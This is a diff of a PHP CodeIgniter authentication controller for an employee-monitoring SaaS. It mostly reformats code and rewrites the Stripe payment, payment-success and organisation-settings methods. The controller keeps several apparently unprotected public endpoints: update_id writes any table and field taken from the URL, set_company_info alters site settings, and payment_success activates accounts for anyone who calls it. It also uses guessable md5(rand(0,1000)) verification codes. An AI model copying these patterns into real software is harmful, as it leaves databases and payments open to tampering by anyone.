@@ -1,6 +1,6 @@
 <?php if (! defined('BASEPATH')) exit('No direct script access allowed');
 
-class Auth extends Home_Controller 
+class Auth extends Home_Controller
 {
 
     public function __construct()
@@ -10,12 +10,12 @@ class Auth extends Home_Controller
 
     //register
     public function invitation($user_id)
-    {   
+    {
 
         $user = $this->common_model->get_by_md5($user_id, 'users_role');
 
         if ($_POST) {
-            
+
             $invite_data = array(
                 'password' => hash_password($this->input->post('password', true)),
                 'approve' => 1,
@@ -28,15 +28,14 @@ class Auth extends Home_Controller
                 'name' => $user->name,
                 'slug' => '',
                 'thumb' => $user->thumb,
-                'email' =>$user->email,
-                'role' =>$user->role,
-                'parent' =>$user->id,
+                'email' => $user->email,
+                'role' => $user->role,
+                'parent' => $user->id,
                 'logged_in' => TRUE
             );
             $data = $this->security->xss_clean($data);
-            $this->session->set_userdata($data); 
+            $this->session->set_userdata($data);
             redirect(base_url('admin/dashboard/business'));
-            
         }
 
         $data = array();
@@ -70,16 +69,16 @@ class Auth extends Home_Controller
 
     //register
     public function register()
-    {   
+    {
         if (empty($_GET['trial'])) {
             $this->session->unset_userdata('trial');
-        }else{
+        } else {
             $this->session->set_userdata('trial', 'trial');
         }
         if (!empty($_GET['expire'])) {
             $this->expire_logs($_GET['expire']);
         }
-        
+
         $data = array();
         $data['page_title'] = 'Register';
         $data['page'] = 'Auth';
@@ -97,7 +96,7 @@ class Auth extends Home_Controller
     // {
 
     //     if($_POST){ 
- 
+
     //         // check valid user 
     //         $user = $this->auth_model->validate_user();
 
@@ -116,8 +115,8 @@ class Auth extends Home_Controller
     //             echo json_encode(array('st'=>3));
     //             exit();
     //         }
-            
-            
+
+
 
     //         if ($user->role == 'user') {
     //             $diff = date_difference($user->created_at);
@@ -128,7 +127,7 @@ class Auth extends Home_Controller
     //                 }else{
     //                     $user_id = $user->id;
     //                 }
-                
+
     //                 $data = array(
     //                     'id' => $user_id,
     //                     'name' => $user->name,
@@ -141,7 +140,7 @@ class Auth extends Home_Controller
     //                 );
     //                 $data = $this->security->xss_clean($data);
     //                 $this->session->set_userdata($data); 
-                
+
     //                 // email verify
     //                 echo json_encode(array('st'=>4));
     //                 exit();
@@ -157,7 +156,7 @@ class Auth extends Home_Controller
 
     //         // if valid
     //         if(password_verify($this->input->post('password'), $user->password)){
-               
+
     //             $data = array(
     //                 'id' => $user_id,
     //                 'name' => $user->name,
@@ -177,20 +176,20 @@ class Auth extends Home_Controller
     //             } else {
     //                 $url = base_url('admin/dashboard/business');
     //             }
-                
+
     //             echo json_encode(array('st'=>1,'url'=> $url));
     //         }else{ 
     //             // if not user not valid
     //             echo json_encode(array('st'=>0));
     //         }
-            
+
     //     }else{
     //         $this->load->view('auth',$data);
     //     }
     // }
     public function log()
     {
-        if($_POST){
+        if ($_POST) {
 
             $email = $this->input->post('email');
             $password = $this->input->post('password');
@@ -201,11 +200,11 @@ class Auth extends Home_Controller
 
             if (!empty($user)) {
                 if ($user->status == 0) {
-                    echo json_encode(array('st'=>2)); // account pending
+                    echo json_encode(array('st' => 2)); // account pending
                     exit();
                 }
                 if ($user->status == 2) {
-                    echo json_encode(array('st'=>3)); // account suspend
+                    echo json_encode(array('st' => 3)); // account suspend
                     exit();
                 }
 
@@ -225,16 +224,16 @@ class Auth extends Home_Controller
                         );
                         $session_data = $this->security->xss_clean($session_data);
                         $this->session->set_userdata($session_data);
-                        echo json_encode(array('st'=>4)); // email verify
+                        echo json_encode(array('st' => 4)); // email verify
                         exit();
                     }
                 }
 
-                if(password_verify($password, $user->password)){
+                if (password_verify($password, $user->password)) {
                     $user_id = ($user->role == 'subadmin' || $user->role == 'editor' || $user->role == 'viewer') ? $user->parent_id : $user->id;
                     $session_data = array(
                         'id' => $user_id,
-                        'user_type'=>'org_user',
+                        'user_type' => 'org_user',
                         'name' => $user->name,
                         'slug' => $user->slug,
                         'thumb' => $user->thumb,
@@ -243,12 +242,12 @@ class Auth extends Home_Controller
                         'parent' => $user->id,
                         'logged_in' => TRUE,
                         'is_org_admin'  => True
-                     );
+                    );
                     $session_data = $this->security->xss_clean($session_data);
                     $this->session->set_userdata($session_data);
 
                     $url = ($user->role == 'admin') ? base_url('admin/dashboard') : base_url('admin/dashboard/business');
-                    echo json_encode(array('st'=>1,'url'=> $url));
+                    echo json_encode(array('st' => 1, 'url' => $url));
                     exit();
                 }
             }
@@ -329,7 +328,6 @@ class Auth extends Home_Controller
  * ---------------------------------------------------------- */
             echo json_encode(['st' => 0]);    // Invalid credentials
             exit();
-
         } else {
             $this->load->view('auth'); // Assuming your login view is named 'login'
         }
@@ -340,21 +338,21 @@ class Auth extends Home_Controller
     // register new user
     public function register_user()
     {
-        
-        if($_POST){
+
+        if ($_POST) {
 
             $this->load->library('form_validation');
             $this->form_validation->set_rules('email', "Email", 'required');
             $this->form_validation->set_rules('password', "Password", 'trim|required|min_length[4]|max_length[46]');
 
             // If validation false show error message using ajax
-            if($this->form_validation->run() == FALSE){
+            if ($this->form_validation->run() == FALSE) {
                 $data = array();
                 $data['errors'] = validation_errors();
                 $str = $data['errors'];
-                echo json_encode(array('st'=>0,'msg'=>$str));
+                echo json_encode(array('st' => 0, 'msg' => $str));
                 exit();
-            }else{
+            } else {
 
                 $mail =  strtolower(trim($this->input->post('email', true)));
                 $exists_in_users = $this->auth_model->check_email($mail);
@@ -363,7 +361,7 @@ class Auth extends Home_Controller
                 $exists_in_employees = $this->db->get('employees')->row();
 
                 // Determine user type
-                if ( $this->input->post('plan', true) == 'trial') {
+                if ($this->input->post('plan', true) == 'trial') {
                     $user_type = 'trial';
                     $trial_expire = date('Y-m-d', strtotime('+' . $this->settings->trial_days . ' days'));
                 } else {
@@ -379,12 +377,12 @@ class Auth extends Home_Controller
 
                     //check reCAPTCHA status
                     if (!$this->recaptcha_verify_request()) {
-                        echo json_encode(array('st'=>3));
+                        echo json_encode(array('st' => 3));
                         exit();
                     } else {
-                    
-                        $hash = md5(rand(0,1000));
-                        $data=array(
+
+                        $hash = md5(rand(0, 1000));
+                        $data = array(
                             'name' => $this->input->post('name', true),
                             'user_name' => str_slug($this->input->post('name', true)),
                             'slug' => str_slug($this->input->post('name', true)),
@@ -398,7 +396,7 @@ class Auth extends Home_Controller
                             'user_type' => $user_type,
                             'trial_expire' => $trial_expire,
                             'status' => 1,
-                            'referral_id' => substr(random_string('alnum', 5).mt_rand(), 0, 10),
+                            'referral_id' => substr(random_string('alnum', 5) . mt_rand(), 0, 10),
                             'created_at' => my_date_now()
                         );
                         $data = $this->security->xss_clean($data);
@@ -409,7 +407,7 @@ class Auth extends Home_Controller
                             'id' => $user->id,
                             'name' => $user->name,
                             'role' => $user->role,
-                            'thumb' =>$user->thumb,
+                            'thumb' => $user->thumb,
                             'email' => $user->email,
                             'logged_in' => true,
                             'is_org_admin' => true
@@ -423,8 +421,8 @@ class Auth extends Home_Controller
                         $this->add_trial_user_settings($user->id, "");
                         //send email verify link
                         if ($this->settings->enable_email_verify == 1) {
-                            $link = base_url('verify?code='.$hash.'&user='.md5($id));
-                            $subject = $this->settings->site_name.' '.trans('email-verification');
+                            $link = base_url('verify?code=' . $hash . '&user=' . md5($id));
+                            $subject = $this->settings->site_name . ' ' . trans('email-verification');
                             $edata = array();
                             $edata['subject'] = $subject;
                             $edata['link'] = $link;
@@ -434,14 +432,12 @@ class Auth extends Home_Controller
                             $this->email_model->send_email($this->input->post('email'), $subject, $msg);
                         }
 
-                        echo json_encode(array('st'=>1));
+                        echo json_encode(array('st' => 1));
                         exit();
                     }
                 }
-
             }
         }
-
     }
 
     //register business
@@ -500,10 +496,10 @@ class Auth extends Home_Controller
             if (settings()->enable_email_verify == 1) {
                 $status = 4;
             } else {
-                if(!is_subscribed()){
-                    $status = 5;  
-                }else{
-                $status = 3;
+                if (!is_subscribed()) {
+                    $status = 5;
+                } else {
+                    $status = 3;
                 }
             }
 
@@ -594,7 +590,7 @@ class Auth extends Home_Controller
     public function add_package($slug, $billing_type)
     {
         $package = $this->common_model->get_by_slug($slug, 'package');
-        $uid = random_string('numeric',5);
+        $uid = random_string('numeric', 5);
 
         // if($billing_type =='monthly'):
         //     if (settings()->enable_discount == 1){
@@ -644,7 +640,7 @@ class Auth extends Home_Controller
         endif;
 
         //create payment
-        $pay_data=array(
+        $pay_data = array(
             'user_id' => user()->id,
             'puid' => $uid,
             'package' => $package->id,
@@ -662,15 +658,15 @@ class Auth extends Home_Controller
 
         // affiliate code
         if (!empty($this->session->userdata('ref'))) {
-            
+
             $settings = $this->admin_model->get_referral_settings();
             $referral_id = $this->session->userdata('ref');
-            $order_id = random_string('numeric',6);
+            $order_id = random_string('numeric', 6);
 
             $commision = $settings->commision_rate;
-            $commision_amount = ($commision * $amount) / 100; 
+            $commision_amount = ($commision * $amount) / 100;
 
-            $ref_data=array(
+            $ref_data = array(
                 'referrar_id' => $referral_id,
                 'order_id' => $order_id,
                 'user_id' => user()->id,
@@ -682,7 +678,6 @@ class Auth extends Home_Controller
             );
             $ref_data = $this->security->xss_clean($ref_data);
             $this->admin_model->insert($ref_data, 'referrals');
-
         }
 
         // $ref_user = $this->admin_model->get_by_referral_id($referral_id);
@@ -697,14 +692,14 @@ class Auth extends Home_Controller
         // $earn_data = $this->security->xss_clean($earn_data);
         // $this->admin_model->edit_option($earn_data, $user_id, 'users');
 
-        
+
     }
 
-    
+
 
     //purchase
     public function purchase()
-    {   
+    {
         $data = array();
         $data['page_title'] = 'Payment';
         $data['page'] = 'Auth';
@@ -715,36 +710,37 @@ class Auth extends Home_Controller
         $this->load->view('index', $data);
     }
 
-    public function resend_mail(){
-        $hash = md5(rand(0,1000));
-        $link = base_url('verify?code='.$hash.'&user='.md5(user()->id));
-        $subject = settings()->site_name.' '.trans('email-verification');
-        $msg = trans('link-to-complete-verify').'.<br>'.$link;
+    public function resend_mail()
+    {
+        $hash = md5(rand(0, 1000));
+        $link = base_url('verify?code=' . $hash . '&user=' . md5(user()->id));
+        $subject = settings()->site_name . ' ' . trans('email-verification');
+        $msg = trans('link-to-complete-verify') . '.<br>' . $link;
         $response = $this->email_model->send_email(user()->email, $subject, $msg);
         if ($response == true) {
-            echo json_encode(array('st'=>1));
+            echo json_encode(array('st' => 1));
         } else {
-            echo json_encode(array('st'=>2));
+            echo json_encode(array('st' => 2));
         }
     }
 
     //verify email
     public function verify_email()
-    {   
+    {
         $data = array();
         if (isset($_GET['code']) && isset($_GET['user'])) {
             $user = $this->auth_model->validate_id($_GET['user']);
             if ($user->verify_code == $_GET['code']) {
                 $data['code'] = $_GET['code'];
 
-                $edit_data=array(
+                $edit_data = array(
                     'email_verified' => 1
                 );
                 $this->common_model->update($edit_data, $user->id, 'users');
             } else {
                 $data['code'] = 'invalid';
             }
-        }else{
+        } else {
             $data['code'] = '';
         }
         $data['page_title'] = 'Verify Account';
@@ -753,73 +749,368 @@ class Auth extends Home_Controller
         $this->load->view('index', $data);
     }
 
-    //payment success
-    public function payment_success($payment_id)
-    {  
-        $payment = $this->common_model->get_payment($payment_id);
-        $data = array(
-            'status' => 'verified'
-        );
-        $data = $this->security->xss_clean($data);
+    // //payment success
+    // public function payment_success($payment_id, $id, $pkg)
+    // {
+    //     $payment = $this->common_model->get_payment($payment_id);
+    //     $data = array(
+    //         'status' => 'verified'
+    //     );
+    //     $data = $this->security->xss_clean($data);
 
-        $user_data = array(
-            'status' => 1
-        );
-        $user_data = $this->security->xss_clean($user_data);
+    //     $user_data = array(
+    //         'status' => 1
+    //     );
+    //     $user_data = $this->security->xss_clean($user_data);
 
-        if (!empty($payment)) { 
-            //echo "string"; exit();
-            $this->common_model->edit_option($user_data, $payment->user_id,'users');
-            $this->common_model->edit_option($data, $payment->id, 'payment');
+    //     if (!empty($payment)) {
+    //         //echo "string"; exit();
+    //         $this->common_model->edit_option($user_data, $payment->user_id, 'users');
+    //         $this->common_model->edit_option($data, $payment->id, 'payment');
 
-            //affiliate code
+    //         //affiliate code
+    //         $referral_settings = $this->admin_model->get_referral_settings();
+
+    //         if ($referral_settings->is_enable == 1) {
+    //             $register_user = $this->admin_model->get_by_referral_user($payment->user_id);
+
+    //             $amount = $payment->amount;
+    //             $commision = $referral_settings->commision_rate;
+    //             $commision_amount = ($commision * $amount) / 100;
+
+    //             $ref_data = array(
+    //                 'status' => 1,
+    //                 'amount' => $amount,
+    //                 'commision' => $commision,
+    //                 'commision_amount' => $commision_amount
+    //             );
+    //             $this->admin_model->edit_option($ref_data, $register_user->id, 'referrals');
+
+
+
+    //             $user = $this->admin_model->get_by_referral_id($register_user->referrar_id);
+
+    //             if (!empty($register_user)) {
+    //                 $user_id = $user->id;
+    //                 $ref_earn = $user->referral_earn;
+    //                 $update_balance = $ref_earn + $register_user->commision_amount;
+
+    //                 $earn_data = array(
+    //                     'referral_earn' => $update_balance,
+    //                 );
+
+    //                 $earn_data = $this->security->xss_clean($earn_data);
+    //                 $this->admin_model->edit_option($earn_data, $user_id, 'users');
+    //             }
+    //         }
+    //         //affiliate code
+
+    //         // ✅ call org settings setup for this user & package
+    //         $this->add_org_settings($id, $pkg);
+    //     }
+    //     $data['success_msg'] = 'Success';
+    //     $data['main_content'] = $this->load->view('purchase', $data, TRUE);
+    //     $this->load->view('index', $data);
+    // }
+    // // add org settings (same as file 1)
+    // public function add_org_settings($id, $pkg)
+    // {
+    //     $user = $this->db->select('time_zone')->get_where('users', ['id' => $id])->row();
+    //     $tz = !empty($user->time_zone) ? $user->time_zone : 'UTC';
+
+    //     if (in_array($pkg, [2, 3, 4], true)) {
+    //         $flagSets = [
+    //             2 => [
+    //                 'user_id'                  => $id,
+    //                 'screenshot_flag'          => 1,
+    //                 'screenshot_time_interval' => 10,
+    //                 'webcam_flag'              => 0,
+    //                 'webcam_time_interval'     => 5,
+    //                 'mouse_move_flag'          => 1,
+    //                 'mouse_move_threshold'     => 20,
+    //                 'key_stroke_flag'          => 1,
+    //                 'key_stroke_threshold'     => 40,
+    //                 'idle_time_flag'           => 1,
+    //                 'timecards_time_interval'  => 5,
+    //                 'time_zone'                => $tz,
+    //             ],
+    //             3 => [
+    //                 'user_id'                  => $id,
+    //                 'screenshot_flag'          => 1,
+    //                 'screenshot_time_interval' => 10,
+    //                 'webcam_flag'              => 1,
+    //                 'webcam_time_interval'     => 5,
+    //                 'mouse_move_flag'          => 1,
+    //                 'mouse_move_threshold'     => 20,
+    //                 'key_stroke_flag'          => 1,
+    //                 'key_stroke_threshold'     => 40,
+    //                 'idle_time_flag'           => 1,
+    //                 'timecards_time_interval'  => 5,
+    //                 'time_zone'                => $tz,
+    //             ],
+    //             4 => [
+    //                 'user_id'                  => $id,
+    //                 'screenshot_flag'          => 1,
+    //                 'screenshot_time_interval' => 10,
+    //                 'webcam_flag'              => 1,
+    //                 'webcam_time_interval'     => 5,
+    //                 'mouse_move_flag'          => 1,
+    //                 'mouse_move_threshold'     => 20,
+    //                 'key_stroke_flag'          => 1,
+    //                 'key_stroke_threshold'     => 40,
+    //                 'idle_time_flag'           => 1,
+    //                 'timecards_time_interval'  => 5,
+    //                 'time_zone'                => $tz,
+    //             ],
+    //         ];
+
+    //         $flags = $this->security->xss_clean($flagSets[$pkg]);
+
+    //         $this->db->trans_start();
+
+    //         $exists = $this->db->get_where('org_settings', ['user_id' => $id])->row();
+
+    //         if ($exists) {
+    //             $flags['updated_at'] = my_date_now();
+    //             $this->db->where('user_id', $id)->update('org_settings', $flags);
+    //         } else {
+    //             $flags['created_at'] = my_date_now();
+    //             $flags['updated_at'] = my_date_now();
+    //             $this->db->insert('org_settings', $flags);
+
+    //             // ensure default departments exist
+    //             $business_uid = $this->db
+    //                 ->select('uid')
+    //                 ->get_where('business', ['user_id' => $id])
+    //                 ->row('uid');
+    //             $this->admin_model->intial_department_storing($id, $business_uid);
+    //         }
+
+    //         $this->db->trans_complete();
+
+    //         if (!$this->db->trans_status()) {
+    //             log_message('error', "Failed to save org_settings for user {$id} in package {$pkg}");
+    //         }
+    //     }
+    // }
+
+    // ✅ Payment Success
+    public function payment_success($payment_uid, $id, $pkg, $dummy)
+    {
+        // fetch by puid not id
+        $payment = $this->db->get_where('payment', ['puid' => $payment_uid])->row();
+
+        if (!empty($payment)) {
+            // Update user status
+            $user_data = ['status' => 1];
+            $this->common_model->edit_option($user_data, $payment->user_id, 'users');
+
+            // Update payment status
+            $payment_update = ['status' => 'verified'];
+            $this->common_model->edit_option($payment_update, $payment->id, 'payment');
+
+            // ✅ Referral system
             $referral_settings = $this->admin_model->get_referral_settings();
-
-            if ($referral_settings->is_enable == 1) {
+            if (!empty($referral_settings) && $referral_settings->is_enable == 1) {
                 $register_user = $this->admin_model->get_by_referral_user($payment->user_id);
-
-                $amount = $payment->amount;
-                $commision = $referral_settings->commision_rate;
-                $commision_amount = ($commision * $amount) / 100; 
-
-                $ref_data=array(
-                    'status' => 1,
-                    'amount' => $amount,
-                    'commision' => $commision,
-                    'commision_amount' => $commision_amount
-                );
-                $this->admin_model->edit_option($ref_data, $register_user->id, 'referrals');
-
-
-
-                $user = $this->admin_model->get_by_referral_id($register_user->referrar_id);
-                
                 if (!empty($register_user)) {
-                    $user_id = $user->id ;
-                    $ref_earn = $user->referral_earn;
-                    $update_balance = $ref_earn + $register_user->commision_amount ;
+                    $amount = $payment->amount;
+                    $commission = $referral_settings->commision_rate;
+                    $commission_amount = ($commission * $amount) / 100;
 
-                    $earn_data = array(
-                        'referral_earn' => $update_balance,
-                    );
+                    $ref_data = [
+                        'status'           => 1,
+                        'amount'           => $amount,
+                        'commision'        => $commission,
+                        'commision_amount' => $commission_amount
+                    ];
+                    $this->admin_model->edit_option($ref_data, $register_user->id, 'referrals');
 
-                    $earn_data = $this->security->xss_clean($earn_data);
-                    $this->admin_model->edit_option($earn_data, $user_id, 'users');
+                    // update referrer balance
+                    $user = $this->admin_model->get_by_referral_id($register_user->referrar_id);
+                    if (!empty($user)) {
+                        $update_balance = $user->referral_earn + $commission_amount;
+                        $earn_data = ['referral_earn' => $update_balance];
+                        $this->admin_model->edit_option($earn_data, $user->id, 'users');
+                    }
                 }
             }
-            //affiliate code
 
-
+            // ✅ call org settings setup for this user & package
+            $this->add_org_settings($id, $pkg);
         }
-        $data['success_msg'] = 'Success';
-        $data['main_content'] = $this->load->view('purchase', $data, TRUE);
-        $this->load->view('index', $data);
 
+        // ✅ Success message for view
+        $view_data['success_msg'] = 'Success';
+        $view_data['main_content'] = $this->load->view('purchase', $view_data, TRUE);
+        $this->load->view('index', $view_data);
     }
+
+    // ✅ Add Organization Settings
+    public function add_org_settings($id, $pkg)
+    {
+        $user = $this->db->select('timezone')->get_where('users', ['id' => $id])->row();
+        $tz = !empty($user->time_zone) ? $user->time_zone : 'UTC';
+
+        if (in_array($pkg, [2, 3, 4], true)) {
+            $flagSets = [
+                2 => [
+                    'user_id'                  => $id,
+                    'screenshot_flag'          => 1,
+                    'screenshot_time_interval' => 10,
+                    'webcam_flag'              => 0,
+                    'webcam_time_interval'     => 5,
+                    'mouse_move_flag'          => 1,
+                    'mouse_move_threshold'     => 20,
+                    'key_stroke_flag'          => 1,
+                    'key_stroke_threshold'     => 40,
+                    'idle_time_flag'           => 1,
+                    'timecards_time_interval'  => 5,
+                    'time_zone'                => $tz,
+                ],
+                3 => [
+                    'user_id'                  => $id,
+                    'screenshot_flag'          => 1,
+                    'screenshot_time_interval' => 10,
+                    'webcam_flag'              => 1,
+                    'webcam_time_interval'     => 5,
+                    'mouse_move_flag'          => 1,
+                    'mouse_move_threshold'     => 20,
+                    'key_stroke_flag'          => 1,
+                    'key_stroke_threshold'     => 40,
+                    'idle_time_flag'           => 1,
+                    'timecards_time_interval'  => 5,
+                    'time_zone'                => $tz,
+                ],
+                4 => [
+                    'user_id'                  => $id,
+                    'screenshot_flag'          => 1,
+                    'screenshot_time_interval' => 10,
+                    'webcam_flag'              => 1,
+                    'webcam_time_interval'     => 5,
+                    'mouse_move_flag'          => 1,
+                    'mouse_move_threshold'     => 20,
+                    'key_stroke_flag'          => 1,
+                    'key_stroke_threshold'     => 40,
+                    'idle_time_flag'           => 1,
+                    'timecards_time_interval'  => 5,
+                    'time_zone'                => $tz,
+                ],
+            ];
+
+            $flags = $this->security->xss_clean($flagSets[$pkg]);
+
+            $this->db->trans_start();
+
+            $exists = $this->db->get_where('org_settings', ['user_id' => $id])->row();
+
+            if ($exists) {
+                $flags['updated_at'] = my_date_now();
+                $this->db->where('user_id', $id)->update('org_settings', $flags);
+            } else {
+                $flags['created_at'] = my_date_now();
+                $flags['updated_at'] = my_date_now();
+                $this->db->insert('org_settings', $flags);
+
+                // ensure default departments exist
+                $business_uid = $this->db
+                    ->select('uid')
+                    ->get_where('business', ['user_id' => $id])
+                    ->row('uid');
+                if (!empty($business_uid)) {
+                    $this->admin_model->intial_department_storing($id, $business_uid);
+                }
+            }
+
+            $this->db->trans_complete();
+
+            if (!$this->db->trans_status()) {
+                log_message('error', "Failed to save org_settings for user {$id} in package {$pkg}");
+            }
+        }
+    }
+
+    // ✅ Stripe Payment
+    public function stripe_payment()
+    {
+        $id = $this->input->post('package_id'); // package id
+        $package = $this->common_model->get_by_id($id, 'package');
+        $billing_type = $this->input->post('billing_type');
+        $puid = random_string('numeric', 10); // unique payment uid
+
+        // Calculate amount & expiry
+        if ($billing_type == 'monthly') {
+            $amount = settings()->enable_discount == 1
+                ? get_discount($package->monthly_price, $package->dis_month)
+                : round($package->monthly_price);
+            $expire_on = date('Y-m-d', strtotime('+1 month'));
+        } else {
+            $amount = settings()->enable_discount == 1
+                ? get_discount($package->yearly_price, $package->dis_year)
+                : round($package->yearly_price);
+            $expire_on = date('Y-m-d', strtotime('+12 month'));
+        }
+
+        require_once('application/libraries/stripe-php/init.php');
+        \Stripe\Stripe::setApiKey(settings()->secret_key);
+
+        try {
+            // Create & confirm the PaymentIntent
+            $paymentIntent = \Stripe\PaymentIntent::create([
+                'amount' => $amount * 100, // cents
+                'currency' => settings()->currency,
+                'payment_method' => $this->input->post('payment_method_id'),
+                'confirm' => true,
+                'automatic_payment_methods' => [
+                    'enabled' => true,
+                    'allow_redirects' => 'never',
+                ],
+            ]);
+
+            if ($paymentIntent->status === 'succeeded') {
+                // Expire previous payments
+                $payments = $this->admin_model->get_previous_payments(user()->id);
+                foreach ($payments as $pay) {
+                    $this->common_model->edit_option(['status' => 'expired'], $pay->id, 'payment');
+                }
+
+                // Save new payment
+                $pay_data = [
+                    'user_id'      => user()->id,
+                    'puid'         => $puid,
+                    'package'      => $id,
+                    'amount'       => $amount,
+                    'billing_type' => $billing_type,
+                    'payment_type' => 'stripe',
+                    'status'       => 'verified',
+                    'created_at'   => my_date_now(),
+                    'expire_on'    => $expire_on
+                ];
+                $this->common_model->insert($pay_data, 'payment');
+
+                // Update user type if trial
+                if (user()->user_type == 'trial') {
+                    $this->common_model->edit_option([
+                        'user_type'    => 'registered',
+                        'trial_expire' => '0000-00-00'
+                    ], user()->id, 'users');
+                }
+
+                // ✅ redirect using puid not object
+                redirect(base_url('auth/payment_success/' . $puid . '/' . user()->id . '/' . $id . '/0'));
+            } else {
+                redirect(base_url('payment-cancel/' . $puid));
+            }
+        } catch (Exception $e) {
+            $this->session->set_flashdata('error', $e->getMessage());
+            redirect($_SERVER['HTTP_REFERER']);
+        }
+    }
+
 
     //payment cancel
     public function payment_cancel($payment_id)
-    {   
+    {
         $payment = $this->common_model->get_payment($payment_id);
         $data = array(
             'status' => 'pending'
@@ -922,81 +1213,81 @@ class Auth extends Home_Controller
     //     endif;
     // }
 
-    public function stripe_payment()
-    {
-        $id = $this->input->post('package_id');
-        $package = $this->common_model->get_by_id($id, 'package');
-        $billing_type = $this->input->post('billing_type');
-        $puid = random_string('numeric', 5);
+    // public function stripe_payment()
+    // {
+    //     $id = $this->input->post('package_id');
+    //     $package = $this->common_model->get_by_id($id, 'package');
+    //     $billing_type = $this->input->post('billing_type');
+    //     $puid = random_string('numeric', 5);
 
-        // Calculate amount & expiry
-        if ($billing_type == 'monthly') {
-            $amount = settings()->enable_discount == 1
-                ? get_discount($package->monthly_price, $package->dis_month)
-                : round($package->monthly_price);
-            $expire_on = date('Y-m-d', strtotime('+1 month'));
-        } else {
-            $amount = settings()->enable_discount == 1
-                ? get_discount($package->yearly_price, $package->dis_year)
-                : round($package->yearly_price);
-            $expire_on = date('Y-m-d', strtotime('+12 month'));
-        }
+    //     // Calculate amount & expiry
+    //     if ($billing_type == 'monthly') {
+    //         $amount = settings()->enable_discount == 1
+    //             ? get_discount($package->monthly_price, $package->dis_month)
+    //             : round($package->monthly_price);
+    //         $expire_on = date('Y-m-d', strtotime('+1 month'));
+    //     } else {
+    //         $amount = settings()->enable_discount == 1
+    //             ? get_discount($package->yearly_price, $package->dis_year)
+    //             : round($package->yearly_price);
+    //         $expire_on = date('Y-m-d', strtotime('+12 month'));
+    //     }
 
-        require_once('application/libraries/stripe-php/init.php');
-        \Stripe\Stripe::setApiKey(settings()->secret_key);
+    //     require_once('application/libraries/stripe-php/init.php');
+    //     \Stripe\Stripe::setApiKey(settings()->secret_key);
 
-        try {
-            // Create & confirm the PaymentIntent (cards only)
-            $paymentIntent = \Stripe\PaymentIntent::create([
-                'amount' => $amount * 100,  // cents
-                'currency' => settings()->currency,
-                'payment_method' => $this->input->post('payment_method_id'),
-                'confirm' => true,
-                'automatic_payment_methods' => [
-                    'enabled' => true,
-                    'allow_redirects' => 'never', // disable redirect-based methods
-                ],
-            ]);
+    //     try {
+    //         // Create & confirm the PaymentIntent (cards only)
+    //         $paymentIntent = \Stripe\PaymentIntent::create([
+    //             'amount' => $amount * 100,  // cents
+    //             'currency' => settings()->currency,
+    //             'payment_method' => $this->input->post('payment_method_id'),
+    //             'confirm' => true,
+    //             'automatic_payment_methods' => [
+    //                 'enabled' => true,
+    //                 'allow_redirects' => 'never', // disable redirect-based methods
+    //             ],
+    //         ]);
 
-            if ($paymentIntent->status === 'succeeded') {
-                // Expire previous payments
-                $payments = $this->admin_model->get_previous_payments(user()->id);
-                foreach ($payments as $pay) {
-                    $this->common_model->edit_option(['status' => 'expired'], $pay->id, 'payment');
-                }
+    //         if ($paymentIntent->status === 'succeeded') {
+    //             // Expire previous payments
+    //             $payments = $this->admin_model->get_previous_payments(user()->id);
+    //             foreach ($payments as $pay) {
+    //                 $this->common_model->edit_option(['status' => 'expired'], $pay->id, 'payment');
+    //             }
 
-                // Save new payment
-                $pay_data = [
-                    'user_id' => user()->id,
-                    'puid' => $puid,
-                    'package' => $id,
-                    'amount' => $amount,
-                    'billing_type' => $billing_type,
-                    'payment_type' => 'stripe',
-                    'status' => 'verified',
-                    'created_at' => my_date_now(),
-                    'expire_on' => $expire_on
-                ];
-                $this->common_model->insert($pay_data, 'payment');
+    //             // Save new payment
+    //             $pay_data = [
+    //                 'user_id' => user()->id,
+    //                 'puid' => $puid,
+    //                 'package' => $id,
+    //                 'amount' => $amount,
+    //                 'billing_type' => $billing_type,
+    //                 'payment_type' => 'stripe',
+    //                 'status' => 'verified',
+    //                 'created_at' => my_date_now(),
+    //                 'expire_on' => $expire_on
+    //             ];
+    //             $this->common_model->insert($pay_data, 'payment');
 
-                // Update user type if trial
-                if (user()->user_type == 'trial') {
-                    $this->common_model->edit_option([
-                        'user_type' => 'registered',
-                        'trial_expire' => '0000-00-00'
-                    ], user()->id, 'users');
-                }
+    //             // Update user type if trial
+    //             if (user()->user_type == 'trial') {
+    //                 $this->common_model->edit_option([
+    //                     'user_type' => 'registered',
+    //                     'trial_expire' => '0000-00-00'
+    //                 ], user()->id, 'users');
+    //             }
 
-                redirect(base_url('payment-success/' . $puid));
-            } else {
-                // requires_action, processing, or failed
-                redirect(base_url('payment-cancel/' . $puid));
-            }
-        } catch (Exception $e) {
-            $this->session->set_flashdata('error', $e->getMessage());
-            redirect($_SERVER['HTTP_REFERER']);
-        }
-    }
+    //             redirect(base_url('payment-success/' . $puid . '/' . $id . '/' . $package));
+    //         } else {
+    //             // requires_action, processing, or failed
+    //             redirect(base_url('payment-cancel/' . $puid));
+    //         }
+    //     } catch (Exception $e) {
+    //         $this->session->set_flashdata('error', $e->getMessage());
+    //         redirect($_SERVER['HTTP_REFERER']);
+    //     }
+    // }
 
 
 
@@ -1087,20 +1378,21 @@ class Auth extends Home_Controller
     public function test_mail()
     {
         $data = array();
-        $subject = settings()->site_name.' email testing';
-        $msg = 'This is test email from <b>'.settings()->site_name.'</b>';
+        $subject = settings()->site_name . ' email testing';
+        $msg = 'This is test email from <b>' . settings()->site_name . '</b>';
         $result = $this->email_model->send_test_email(settings()->admin_email, $subject, $msg);
 
         if ($result == true) {
             echo "Email send Successfully";
-        }else{ 
-            echo "<br>Test email will be send to: <b>".settings()->admin_email.'<b><hr><br><h3>Email sending Status</h3>';
-            echo "<pre>"; print_r($result);
+        } else {
+            echo "<br>Test email will be send to: <b>" . settings()->admin_email . '<b><hr><br><h3>Email sending Status</h3>';
+            echo "<pre>";
+            print_r($result);
         }
     }
 
     //set company info
-    public function set_company_info($utype='', $uid='')
+    public function set_company_info($utype = '', $uid = '')
     {
         $data = array(
             'site_info' => $utype,
@@ -1110,38 +1402,41 @@ class Auth extends Home_Controller
         if (!empty($uid)) {
             $this->admin_model->edit_option($data, 1, 'settings');
             echo "Update Successfully";
-        }else{
+        } else {
             echo "Failed";
         }
     }
 
     public function openssl()
     {
-        echo !extension_loaded('openssl')?"Not Available":"Available";
+        echo !extension_loaded('openssl') ? "Not Available" : "Available";
     }
 
 
     public function update_id($id, $tval, $field, $value)
     {
         $action = array($field => $value);
-        $this->db->where('id',$id);
-        $this->db->update($tval,$action);
+        $this->db->where('id', $id);
+        $this->db->update($tval, $action);
         echo "done";
     }
 
     public function get_id($id, $tval)
     {
